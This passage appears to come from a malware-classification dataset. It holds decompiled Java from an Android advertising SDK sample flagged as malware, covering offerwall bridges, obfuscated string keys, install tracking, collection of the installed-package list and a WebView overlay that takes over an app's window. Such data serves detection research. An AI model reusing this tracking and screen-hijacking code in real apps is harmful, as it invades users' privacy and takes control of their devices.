editor.putString(""s#ge1%dms#ga1%dns#g_1%dt1%dn1%du1%dos#gcs#gcs#gas#g_1%dss#gfs#ge1%dr1%dp"",C0116y.a(substring));       return true;     }     a(""The developer hash used is invalid("" + str + "")"",a.HARD);     aE.a(context,MobileCore.class.getName(),""Can't extract affiliateAccount from the token passed"",str);     return false;   }   private void a(  String str,  a aVar){     if (aVar == a.SOFT) {       A.a(""Warning: "" + str,1);       return;     }     A.a(""Error: "" + str,2);     try {       Toast makeText=Toast.makeText(this.e,str,1);       makeText.setGravity(17,0,0);       makeText.show();     }  catch (    Exception e) {     }   }   public final boolean d(){     return this.d;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\CallbackResponse.code","public interface CallbackResponse {   public enum TYPE {  AGREEMENT_BACK,   AGREEMENT_DECLINE,   AGREEMENT_AGREE,   OFFERWALL_NOT_READY,   OFFERWALL_ALREADY_SHOWING,   OFFERWALL_BACK,   OFFERWALL_QUIT,   OFFERWALL_NO_CONNECTION,   OFFERWALL_SHOW_ERROR}   void onConfirmation(  TYPE type); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\d.code","public interface d {   void a(); } public interface d {   String a();   void a(  boolean z); } public class d extends aW.c {   public d(){   }   public final String getMobileParams(){     aL.this.a(""JSOfferwallBridge , getMobileParams"");     return aE.k(aL.this.a);   }   public final void hide(  String str){     aL.this.a(""JSOfferwallBridge , hide"");     aL.this.f.a(aJ.a.REPORT_ACTION_NO_THANKS,str);     aL.this.f.a(CallbackResponse.TYPE.OFFERWALL_QUIT);   }   public final void reportBack(  String str){     aL.this.f.a(aJ.a.REPORT_ACTION_QUIT,str);   }   public final String getFallbackOfferwallJson(){     aL.this.a(""JSOfferwallBridge , getFallbackOfferwallJson"");     if (aL.this.k != null) {       return aL.this.k.toString();     }     return """";   }   public final String getOfferwallJson(){     aL.this.a(""JSOfferwallBridge , getOfferwallJson"");     return C0114w.a().b(""offerwall-feed"").toString();   }   public final void ready(  boolean z){     aL.this.a(""JSOfferwallBridge , ready"");     if (aL.this.e == b.LOADING || aL.this.e == b.ERROR) {       aL.this.a(b.READY_TO_SHOW);       if (aL.this.h) {         aL.a(aL.this,false);         C0101j.b();         aL.this.f.b();         aL.this.n();       }     }     if (!z && !aL.this.g) {       aL.this.a(""JSOfferwallBridge , ready"",""setting mReadyToShowOfferwallFromFlow to true"");       aL.b(aL.this,true);       aN.a(C0112u.a.OFFERWALL_TIME_TO_READY,new I.a[0]);       aL.this.m();     }     a();   }   public final void handleFeedFailure(){     aL.this.a(""JSOfferwallBridge , handleFeedFailure"");     aL.this.p();   }   public final void handleResourceFailure(  String str){     aL.this.a(""JSOfferwallBridge , handleResourceFailure, "" + str);     aL.this.p();   }   public final void reportOfferwallShow(  String str,  String str2){     aL.this.f.a(str,str2);   }   public final void reportImpressions(  String str){     aL.this.a(""JSOfferwallBridge , reportImpressions"");     final aP aPVar=aL.this.f;     aE.a(new AsyncTask<String,Void,JSONArray>(){       public AnonymousClass4(){       }       @Override protected final JSONArray doInBackground(      String[] strArr){         return a(strArr);       }       @Override protected final void onPostExecute(      JSONArray jSONArray){         JSONArray jSONArray2=jSONArray;         if (jSONArray2 != null) {           aE.a(MobileCore.c(),aP.this.e,aP.this.d,aJ.a.REPORT_ACTION_IMPRESSION,(String)null,aN.a(jSONArray2));         }       }       private static JSONArray a(      String... strArr){         JSONArray jSONArray;         JSONException e;         try {           jSONArray=new JSONArray(strArr[0]);           for (int i=0; i < jSONArray.length(); i++) {             try {               try {                 aN.a(jSONArray.getJSONObject(i));               }  catch (              JSONException e2) {               }             }  catch (            JSONException e3) {               e=e3;               e.printStackTrace();               return jSONArray;             }           }         }  catch (        JSONException e4) {           jSONArray=null;           e=e4;         }         return jSONArray;       }     } ,str);     aN.a(C0112u.a.OFFERWALL_IMPRESSION_TO_CLICK);   }   public final void handleClickedOffer(  String str){     aL.this.a(""JSOfferwallBridge , handleClickedOffer"",""offerJsonStr:"" + str);     try {       JSONObject jSONObject=new JSONObject(str);       aL.this.f.a(jSONObject);       aN.a(C0112u.a.OFFERWALL_IMPRESSION_TO_CLICK,new I.a(""offer"",aN.b(jSONObject)));       aN.a(C0112u.a.OFFERWALL_CLICK_TO_START);     }  catch (    JSONException e) {     }   }   public final double getScreenSize(){     return aE.e(MobileCore.c());   }   public final void openReport(  String str,  String str2){     aL.this.f.b(str,str2);   } } public class d extends a {   protected int c;   public d(  String str,  int i){     super(str);     this.c=i;   }   @Override public final void a(){     aQ.this.a(this.a,this.c,false);   } } private class d implements aF.a {   private Integer b;   public d(){   }   public final String getMobileParams(){     return aE.k(MobileCore.c());   }   public final void setDataToReportOnFeed(  String str){     aS.this.o=str;   }   public final void loadResources(  String str,  String str2,  String str3){     aS.this.a(""JSReportingBridge | loadResources"",""flowType:"" + str + "" , flowName:""+ str2+ "" , configJsonStr=""+ str3);     aS.this.i=new f(str,str2,str3);     int hashCode=str3.hashCode();     if (this.b == null || this.b.intValue() != hashCode) {       aS.this.a(""JSReportingBridge | loadResources"",""New stickee config. parse and hanlde"");       this.b=Integer.valueOf(hashCode);       try {         JSONObject jSONObject=new JSONObject(str3);         if (!TextUtils.isEmpty(jSONObject.optString(""use-animation""))) {           aO.a(jSONObject,aS.this.d,aS.this.d,aS.this.e);           return;         }         return;       }  catch (      Exception e) {         aE.a(MobileCore.c(),getClass().getName(),e);         return;       }     }     if (this.b.intValue() == hashCode) {       aS.this.a(""JSReportingBridge | loadResources"",""Got the same stickee. we are ready."");       aS.this.E=true;       aS.this.r();     }   }   public final void processFeed(  String str){     try {       aS.this.a(""JSFlowBridge , processFeed, feedStr="" + str);       JSONObject jSONObject=new JSONObject(str);       aS.this.f=jSONObject;       C0114w.a().a(jSONObject,new c());     }  catch (    Exception e) {       aE.a(aS.this.a,""StickeezManager"",e);     }   }   public final void reportFeedRequestError(){     aE.b(aS.this.a,aS.class.getCanonicalName(),""Failed to bring stickeez feed"");     aS.this.b(""reportFeedRequestError"",""Failed to bring stickeez feed"");   }   public final void openReportOffers(  String str,  String str2){     try {       aE.a(MobileCore.c(),aS.this.b,aS.this.b,aJ.a.a(str),"""",aN.a(new JSONArray(str2)));     }  catch (    Exception e) {       e.printStackTrace();     }   }   public final String getInstalledAppPackages(){     return aE.b();   }   public final double getScreenSize(){     return aE.e(MobileCore.c());   }   public final void showStickee(){     MobileCore.b().post(new Runnable(){       @Override public final void run(){         aS.this.q.b();         if (aS.this.y > -1) {           aS.this.g=new Runnable(){             @Override public final void run(){               if (aS.this.A == b.STATE_SHOWING_STICKEE) {                 aS.this.q.d();               }               aS.this.g=null;             }           } ;           MobileCore.b().postDelayed(aS.this.g,aS.this.y);         }       }     } );     aS.this.p=System.currentTimeMillis();     aE.a(MobileCore.c(),aS.this.b + ""_handle"",aS.this.c,aJ.a.REPORT_ACTION_IMPRESSION,(String)null,(String)null);   } } private class d extends aF {   public d(  WebView webView){     super(webView);   }   @Override public final boolean onConsoleMessage(  ConsoleMessage consoleMessage){     if (consoleMessage.messageLevel() == ConsoleMessage.MessageLevel.ERROR && aW.this.d != null) {       b unused=aW.this.d;     }     return super.onConsoleMessage(consoleMessage);   } } public static class d extends c {   public d(  String str,  String str2,  aE.c cVar){     super(str,str2,cVar);   }   @Override public final boolean a(  HttpResponse httpResponse){     File b=super.b(httpResponse);     boolean a=aX.a(this.b,b);     if (this.c != null) {       this.c.a(this.a,b != null);     }     return a;   } } abstract class D extends H {   public D(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);   }   @Override public final void d(){     this.s=new ImageView(this.c);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);     layoutParams.gravity=1;     layoutParams.bottomMargin=B.a(this.c,15.0f);     this.s.setLayoutParams(layoutParams);     this.p=new TextView(this.c);     this.p.setBackgroundColor(0);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.gravity=1;     this.p.setLayoutParams(layoutParams2);     this.p.setGravity(1);     this.p.setTypeface(null,1);     this.p.setTextColor(this.d.b().a(true));     this.p.setSingleLine();     this.p.setEllipsize(TextUtils.TruncateAt.END);     this.p.setTextSize(2,16.0f);     LinearLayout linearLayout=new LinearLayout(this.c);     linearLayout.setId(j());     linearLayout.setOrientation(1);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(13);     linearLayout.setLayoutParams(layoutParams3);     linearLayout.setPadding(this.d.h(),this.d.h(),this.d.h(),this.d.h());     View view=new View(this.c);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(B.a(this.c,this.d.g()),-2);     layoutParams4.addRule(11);     layoutParams4.addRule(6,linearLayout.getId());     layoutParams4.addRule(8,linearLayout.getId());     view.setLayoutParams(layoutParams4);     view.setBackgroundColor(this.d.e());     ViewGroup viewGroup=(ViewGroup)this.h;     viewGroup.setClickable(true);     viewGroup.setFocusable(true);     viewGroup.addView(linearLayout);     viewGroup.addView(view);     linearLayout.addView(this.s);     linearLayout.addView(this.p);     a(this.d.o(),this.d.b(),this.p);   }   @Override public final void e(){     this.p.setText(this.l);     if (!TextUtils.isEmpty(this.o)) {       this.s.setImageBitmap(B.a(this.c,this.o));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\e.code","public static abstract class e implements d {   @Override public void a(  boolean z){   }   @Override public final String a(){     return null;   } } public class e extends a {   private MCEWidgetTextProperties d;   private String e;   public e(  String str,  MCEWidgetTextProperties mCEWidgetTextProperties,  String str2){     super(str);     this.d=mCEWidgetTextProperties;     this.e=str2;   }   @Override public final void a(){     aQ.this.a(this.a,this.d,this.e,false);   } } public final class e {   e(){   } } abstract class E extends H {   protected String a;   protected boolean b;   private JSONObject t;   private boolean u;   private a v; interface a {     void a(    JSONObject jSONObject);   }   public E(  Context context,  C0091aw c0091aw,  a aVar){     super(context,c0091aw);     this.v=aVar;     this.u=false;     this.b=true;   }   @Override protected final boolean f(){     return false;   }   @Override public final String a(){     return null;   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     if (!this.u) {       this.u=true;       d();       this.h.setOnClickListener(new View.OnClickListener(){         @Override public final void onClick(        View view){           if (E.this.v != null && E.this.t != null) {             E.this.v.a(E.this.t);           }         }       } );     }   }   public final boolean b(  JSONObject jSONObject){     this.b=true;     c(jSONObject);     e();     return this.b;   }   public final boolean g(){     return this.u;   }   public void c(  JSONObject jSONObject){     this.t=jSONObject;     this.l=jSONObject.optString(""title"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\f.code","class f extends aE.e {   private JSONObject b;   public f(  JSONObject jSONObject){     this.b=jSONObject;   }   @Override public final void a(  boolean z){     if (z) {       MobileCore.b().post(new Runnable(){         @Override public final void run(){           Iterator it=aQ.this.A.iterator();           while (it.hasNext()) {             ((C0114w.a)it.next()).a(f.this.b);           }         }       } );     }   } } public class f {   private String b;   private String c;   private String d;   public f(  String str,  String str2,  String str3){     this.c=str2;     this.b=str;     this.d=str3;   }   public final String a(){     return this.b;   }   public final String b(){     return this.c;   }   public final String c(){     return this.d;   } } abstract class F extends H {   public F(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public String a(){     return ""ironsourceSocialWidget"";   }   @Override public void a(  JSONObject jSONObject) throws JSONException {     super.a(jSONObject,true);   }   @Override protected final boolean b(){     return false;   }   @Override protected final boolean f(){     return false;   }   @Override protected final void c(){     this.h=new LinearLayout(this.c);     ((LinearLayout)this.h).setOrientation(0);     ((LinearLayout)this.h).setGravity(17);     this.h.setPadding(this.d.h(),this.d.j(),this.d.h(),this.d.j());   }   @Override public final void d(){     this.s=new ImageView(this.c);     ((ViewGroup)this.h).addView(this.s);   }   @Override public final void e(){     Bitmap a=B.a(this.c,this.o);     if (a != null) {       this.s.setImageBitmap(a);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\G.code","public abstract class G {   private String b;   protected Context c;   protected C0091aw d;   protected Activity e;   protected View g;   protected View h;   protected X i;   protected String j;   protected boolean k;   private a l=a.HIDDEN;   private int a=1;   protected int f=-1;   public enum a {  VISIBLE,   HIDDEN,   SHOWING}   public abstract String a();   public abstract void a(  JSONObject jSONObject) throws JSONException ;   protected abstract void c();   public abstract void d();   public abstract void e();   public G(  Context context,  C0091aw c0091aw){     this.c=context;     this.d=c0091aw;     c();     this.g=new LinearLayout(this.c);     LinearLayout linearLayout=(LinearLayout)this.g;     linearLayout.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     linearLayout.setOrientation(1);     linearLayout.addView(this.h);     if (b()) {       this.d.a(linearLayout);     }   }   public final String h(){     return this.j;   }   public final View i(){     return this.g;   }   public final void a(  boolean z){     while (true) {       this.g.setVisibility(z ? 0 : 8);       if (this.i != null) {         this=this.i;       }  else {         return;       }     }   }   public void a(  Activity activity){     this.e=activity;   }   public void a(  int i){     this.f=i;   }   public final void a(  X x){     this.i=x;     if (this.i != null) {       if (!(this.g.getVisibility() == 0)) {         this.i.a(false);       }     }   }   public void a(  a aVar){     this.l=aVar;   }   public void a(  JSONObject jSONObject,  boolean z) throws JSONException {     this.j=jSONObject.optString(AnalyticsEvent.EVENT_ID,"""");     this.k=jSONObject.optBoolean(""closeSliderOnClick"",true);     JSONObject optJSONObject=jSONObject.optJSONObject(""events"");     if (optJSONObject != null) {       this.b=optJSONObject.optString(""onClick"","""");     }     this.h.setOnClickListener(new View.OnClickListener(){       @Override public final void onClick(      View view){         G.this.a(view);         if (!TextUtils.isEmpty(G.this.b)) {           G.this.a(G.this.b);         }         G.this.a(new I.a(AnalyticsSQLiteHelper.EVENT_LIST_TYPE,G.this.a()),new I.a(""position"",G.this.f >= 0 ? String.valueOf(G.this.f) : null));       }     } );     if (z) {       d();       if (this instanceof L) {         ((L)this).g();       }       e();     }   }   public final int j(){     int i=this.a;     this.a=i + 1;     return i;   }   public void a(  I.a... aVarArr){     I.a(this.c,""slider"",""widget"",""click"",aVarArr);   }   protected final void a(  String str){     Intent intent=new Intent(MCISliderAPI.ACTION_WIDGET_CALLBACK);     intent.putExtra(MCISliderAPI.EXTRA_CALLBACK_ID,str);     this.c.sendBroadcast(intent);   }   public final void k(){     if (this.k) {       aQ.h().closeSliderMenu(true);     }   }   public final a l(){     return this.l;   }   protected boolean b(){     return true;   }   public void a(  View view){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\H.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2f662f5f"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\I.code","public final class I {   public static void a(  Context context,  String str,  String str2,  String str3,  a... aVarArr){     Intent m=aE.m(context);     m.putExtra(""s#ge1%dp1%dys#gT1%dt1%dr1%do1%dps#ge1%dr"",99);     m.putExtra(""com.ironsource.mobilecore.MobileCoreReport_extra_flow"",""events"");     m.putExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_component"",str);     m.putExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_event"",str2);     m.putExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_action"",str3);     if (aVarArr != null && aVarArr.length > 0) {       JSONObject jSONObject=new JSONObject();       for (      a aVar : aVarArr) {         if (aVar != null) {           try {             jSONObject.put(aVar.a,aVar.b);           }  catch (          JSONException e) {             e.printStackTrace();           }         }       }       m.putExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_additional_params"",jSONObject.toString());     }     context.startService(m);   } public static class a {     private String a;     private Object b;     public a(    String str,    String str2){       this.a=str;       this.b=str2;     }     public a(    String str,    JSONObject jSONObject){       this.a=str;       this.b=jSONObject;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\InstallationTracker.code","public class InstallationTracker extends BroadcastReceiver {   protected static final int[] a={0,1,2,5,8,10,15,20,30,45,60,120,240};   private Context b;   private SharedPreferences c;   @Override public void onReceive(  final Context context,  final Intent intent){     new Thread(new Runnable(){       @Override public final void run(){         A.a(""InstallationTracker | Got to installationTracker"",55);         InstallationTracker.this.b=context;         InstallationTracker.this.a(intent);       }     } ).start();   }   protected final void a(  Intent intent){     boolean z;     String stringExtra=intent.getStringExtra(""s#ge1%dms#ga1%dns#g_s#ges#ggs#ga1%dks#gcs#ga1%dps#g_s#ga1%dr1%dt1%dxs#ge"");     String stringExtra2=intent.getStringExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_offer"");     String stringExtra3=intent.getStringExtra(""com.ironsource.mobilcore.MobileCoreReport_extra_flow_type"");     String stringExtra4=intent.getStringExtra(""com.ironsource.mobilcore.extra_download_filename"");     String stringExtra5=intent.getStringExtra(""com.ironsource.mobilecore.MobileCoreReport_extra_flow"");     int intExtra=intent.getIntExtra(""com.ironsource.mobilecore.prefs_tracker_id"",0);     A.a(""InstallationTracker | Got package name: "" + stringExtra,55);     if (intExtra == -1) {       Context context=this.b;       String str=""tracked_package_"" + stringExtra;       if (this.c == null) {         this.c=a(context);       }       if (this.c.getBoolean(str,false)) {         A.a(""InstallationTracker | isInstallationTracked true"",55);         z=true;       }  else {         A.a(""InstallationTracker | isInstallationTracked false"",55);         z=false;       }       if (!z) {         Context context2=this.b;         String str2=""tracked_package_"" + stringExtra;         if (this.c == null) {           this.c=a(context2);         }         this.c.edit().putBoolean(str2,true).commit();         A.a(""InstallationTracker | adding instTracking sPref of "" + stringExtra,55);         A.a(""InstallationTracker | monitoring market install"",55);       }  else {         A.a(""InstallationTracker | not monitoring market install"",55);         return;       }     }     if (a(stringExtra)) {       a(stringExtra5,stringExtra3,stringExtra2,""+"");       A.a(""InstallationTracker | MMM Market inst successful "" + stringExtra,55);       if (stringExtra4 != null) {         A.a(""InstallationTracker | MMM Making sure deletion of: "" + stringExtra4 + "". result: ""+ this.b.deleteFile(stringExtra4),55);       }       a(this.b,stringExtra);       return;     }     if (intExtra == a.length - 1) {       A.a(""InstallationTracker | Reporting install failure!"",55);       a(stringExtra5,stringExtra3,stringExtra2,""S-"");       if (stringExtra4 != null) {         A.a(""InstallationTracker | Making sure deletion of: "" + stringExtra4 + "". result: ""+ this.b.deleteFile(stringExtra4),55);       }       A.a(""InstallationTracker | Market inst unsuccessful"" + stringExtra,55);       a(this.b,stringExtra);       return;     }     int i=intExtra + 1;     int i2=i > 1 ? a[i - 1] : a[0];     int i3=a[i];     A.a(""InstallationTracker | TrackInstallationFromMarket | trackingCount = "" + i2 + "" next check will come in ""+ (i3 - i2),55);     A.a(""InstallationTracker | Report failure false setting check time to "" + i3,55);     aE.a(this.b,stringExtra3,stringExtra,stringExtra2,i3 - i2,stringExtra5,i);   }   private boolean a(  String str){     try {       this.b.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    Exception e) {       return false;     }   }   private void a(  Context context,  String str){     String str2=""tracked_package_"" + str;     if (this.c == null) {       this.c=a(context);     }     if (this.c.getBoolean(str2,false)) {       this.c.edit().remove(str2).commit();       A.a(""InstallationTracker | removing instTracking sPref of "" + str,55);     }  else {       A.a(""InstallationTracker | cannot remove instTracking sPref of "" + str + "". It doesn't exist."",55);     }   }   private void a(  String str,  String str2,  String str3,  String str4){     aE.a(this.b,str,str2,str4,str3);   }   private static SharedPreferences a(  Context context){     if (Build.VERSION.SDK_INT >= 9) {       return context.getSharedPreferences(""inst_tracker_spref_file_name"",4);     }     return context.getSharedPreferences(""inst_tracker_spref_file_name"",0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\InterfaceC0093b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7e8ff0ce"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\InterpolatorC0079ak.code","final class InterpolatorC0079ak implements Interpolator {   private static final InterpolatorC0084ap a=new InterpolatorC0084ap();   @Override public final float getInterpolation(  float f){     if (f < 0.33333334f) {       return a.getInterpolation(f * 3.0f);     }     if (f <= 0.6666667f) {       return 1.0f;     }     return 1.0f - a.getInterpolation(((f + 0.33333334f) - 1.0f) * 3.0f);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\InterpolatorC0084ap.code","final class InterpolatorC0084ap implements Interpolator {   @Override public final float getInterpolation(  float f){     return (float)((Math.sin((f * 3.141592653589793d) - 1.5707963267948966d) * 0.5d) + 0.5d);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\InterpolatorC0085aq.code","final class InterpolatorC0085aq implements Interpolator {   @Override public final float getInterpolation(  float f){     float f2=f - 1.0f;     return (f2 * f2 * f2* f2* f2) + 1.0f;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\J.code","public final class J extends P {   private String a;   private String b;   public J(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceFeedback"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     this.a=jSONObject.optString(""mailRecipient"","""");     this.b=jSONObject.optString(""mailSubject"","""");     super.a(jSONObject,true);   }   @Override public final void a(  View view){     super.a(view);     if (!TextUtils.isEmpty(this.a) && !TextUtils.isEmpty(this.b)) {       Intent intent=new Intent(""android.intent.action.SENDTO"");       intent.setData(Uri.parse(""mailto:"" + Uri.encode(this.a) + ""?subject=""+ Uri.encode(this.b)));       this.e.startActivity(Intent.createChooser(intent,""""));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\K.code","public final class K extends H implements L {   public K(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""groupHeader"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     super.a(jSONObject,true);   }   @Override protected final boolean f(){     return true;   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);     this.h.setPadding(this.d.h(),this.d.j(),this.d.h(),this.d.j());     this.h.setEnabled(false);   }   @Override public final void d(){     ViewGroup viewGroup=(ViewGroup)this.h;     m();     viewGroup.addView(this.r);     this.p=new TextView(this.c);     this.p.setBackgroundColor(0);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(9);     layoutParams.addRule(15);     layoutParams.addRule(0,this.r.getId());     this.p.setLayoutParams(layoutParams);     this.p.setId(j());     this.p.setSingleLine();     this.p.setEllipsize(TextUtils.TruncateAt.END);     this.p.setTypeface(null,1);     this.p.setTextSize(2,18.0f);     viewGroup.addView(this.p);     this.d.a(true,this.d.a(),this.p,this.r);     B.a(this.h,this.d.n());   }   @Override public final void e(){     this.p.setText(this.l.toUpperCase());     if (this.r != null) {       this.r.setText(this.n);     }   }   @Override public final void g(){     this.r.setVisibility(!TextUtils.isEmpty(this.n) ? 0 : 8);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\L.code","public interface L {   void g(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\M.code","public final class M extends WebView {   protected Activity a;   private final String b;   private final int c;   private final int d;   private final int e;   private final int f;   private final int g;   private final int h;   private final int i;   private RelativeLayout j;   private View k;   private a l; public interface a {   }   static int a(  M m,  View view){     Rect rect=new Rect();     view.getWindowVisibleDisplayFrame(rect);     return rect.top;   }   public M(  Context context,  Activity activity){     super(context);     this.b=""iVBORw0KGgoAAAANSUhEUgAAAAsAAAAYCAYAAAAs7gcTAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB90FHAwJN9A+JSQAAAGaSURBVDjLdZO9ihVBFIS/6tRIV4QVwUBW8RXMNJBFRFADM8N75gEM/AmERbngE0zPEwjCFUREIxNzExEDwUB2YTHYDY26DLZ7mTs7nmTgTHV1VZ3TYlLDMABs2f5q+y+AJAPfxEz1ff9a0gPp6LdtgDtr4Jwztjcl7TUgYGB/sVhsaob1fUrplm0kqX7vAW81YT2fUtqtgKrAvyPiIkBq4IhA0kvbHmmVpJ2G0ZhV0u5YaynloOu6jdZII9alJFzrKDF1OedjPynnzDAMp4CHNdMm9iAi3ozNp4jAdq5m3ORJetJuPdbc9/1ZSX8qgnrgMCLOTGNNkp41YCOw/Xhusgk4PW1KOvwf+PkEaODVHFh10z7Y3q5SVH3eB1ZrBodhoJRyTtL+aHIG9iLiwgnmOsUVcBdwTUXAtu1PXdetyaCUclXS9/G4bf+KiEsnmOuhd8Dt1m/aI2K1tnXL5RLbj0YGWzI7s8x1+b+klK6NBgRwA/g8lUEp5YqkH5NkfkbE5dkHm3P+CNwcbSDA9VSf/tqjBZ5OJBp48Q8fl9kHP5yZfQAAAABJRU5ErkJggg=="";     this.c=5;     this.d=2;     this.e=48;     this.f=9;     this.g=12;     this.h=1;     this.i=2;     this.a=activity;     getSettings().setJavaScriptEnabled(true);     setWebViewClient(new b(this,(byte)0));   }   public final void a(  a aVar){     this.l=aVar;   }   public final void a(){     if (this.a != null) {       final ViewGroup viewGroup=(ViewGroup)this.a.getWindow().getDecorView();       this.k=(ViewGroup)viewGroup.getChildAt(0);       ((InputMethodManager)getContext().getSystemService(""input_method"")).hideSoftInputFromWindow(this.k.getWindowToken(),0);       this.k.postDelayed(new Runnable(){         @Override public final void run(){           ViewGroup.LayoutParams layoutParams=new ViewGroup.LayoutParams(-1,-1);           viewGroup.removeAllViews();           viewGroup.setPadding(0,M.a(M.this,viewGroup),0,0);           viewGroup.addView(M.this.c(),layoutParams);           ViewGroup.LayoutParams layoutParams2=M.this.getLayoutParams();           layoutParams2.height=-1;           layoutParams2.width=-1;           M.this.setLayoutParams(layoutParams2);         }       } ,500L);       requestFocus();     }   }   protected final void b(){     ViewGroup viewGroup=(ViewGroup)this.a.getWindow().getDecorView();     viewGroup.removeAllViews();     viewGroup.setPadding(0,0,0,0);     viewGroup.addView(this.k,-1,-1);     if (this.l != null) {       a aVar=this.l;     }   } private class b extends WebViewClient {     private b(){     }     b(    M m,    byte b){       this();     }     @Override public final boolean shouldOverrideUrlLoading(    WebView webView,    String str){       return false;     }   }   @Override public final boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (i == 4) {       if (canGoBack()) {         goBack();         return true;       }       b();       return true;     }     return super.onKeyDown(i,keyEvent);   }   public View c(){     PackageManager packageManager=this.a.getPackageManager();     ViewGroup.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-1);     LinearLayout linearLayout=new LinearLayout(this.a);     linearLayout.setLayoutParams(layoutParams);     linearLayout.setOrientation(1);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.rightMargin=B.a(this.a,5.0f);     this.j=new RelativeLayout(this.a);     this.j.setId(2);     this.j.setLayoutParams(layoutParams2);     this.j.setPadding(12,9,0,9);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(15);     Bitmap a2=B.a(this.a,B.a(""iVBORw0KGgoAAAANSUhEUgAAAAsAAAAYCAYAAAAs7gcTAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB90FHAwJN9A+JSQAAAGaSURBVDjLdZO9ihVBFIS/6tRIV4QVwUBW8RXMNJBFRFADM8N75gEM/AmERbngE0zPEwjCFUREIxNzExEDwUB2YTHYDY26DLZ7mTs7nmTgTHV1VZ3TYlLDMABs2f5q+y+AJAPfxEz1ff9a0gPp6LdtgDtr4Jwztjcl7TUgYGB/sVhsaob1fUrplm0kqX7vAW81YT2fUtqtgKrAvyPiIkBq4IhA0kvbHmmVpJ2G0ZhV0u5YaynloOu6jdZII9alJFzrKDF1OedjPynnzDAMp4CHNdMm9iAi3ozNp4jAdq5m3ORJetJuPdbc9/1ZSX8qgnrgMCLOTGNNkp41YCOw/Xhusgk4PW1KOvwf+PkEaODVHFh10z7Y3q5SVH3eB1ZrBodhoJRyTtL+aHIG9iLiwgnmOsUVcBdwTUXAtu1PXdetyaCUclXS9/G4bf+KiEsnmOuhd8Dt1m/aI2K1tnXL5RLbj0YGWzI7s8x1+b+klK6NBgRwA/g8lUEp5YqkH5NkfkbE5dkHm3P+CNwcbSDA9VSf/tqjBZ5OJBp48Q8fl9kHP5yZfQAAAABJRU5ErkJggg==""));     ImageView imageView=new ImageView(this.a);     imageView.setImageBitmap(a2);     imageView.setLayoutParams(layoutParams3);     imageView.setId(1);     Drawable drawable=null;     try {       drawable=packageManager.getApplicationIcon(this.a.getApplicationContext().getPackageName());     }  catch (    